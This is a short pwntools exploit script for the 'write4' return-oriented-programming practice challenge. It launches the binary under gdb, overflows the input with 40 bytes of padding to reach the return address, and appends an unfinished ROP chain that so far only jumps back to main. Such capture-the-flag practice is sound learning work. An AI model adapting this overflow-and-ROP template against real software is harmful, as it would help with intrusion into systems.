from pwn import *
import os
import struct

# Cyclic Sequence: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

gdbcmds = '''
break main
conti
'''

challName = 'write4'

# allows debugging after payload deployed
proc = gdb.debug('./' + challName, gdbscript=gdbcmds)
# exits program after payload deployed
# proc = process('./' + challName)

# useful for later challenges
elf = context.binary = ELF(challName)

# List your addresses here
main = 0x00400607

# Offset to be used to reach rip
padding = b'B' * 40

# Construct ROP chain here
ropChain = b''
#ropChain += struct.pack('<Q', main)

#write to mem
ropChain += struct.pack('<Q', main)

# Deploy ROP chain
buf = padding + ropChain

proc.recvuntil(b'>')
proc.send(buf) 
proc.interactive()
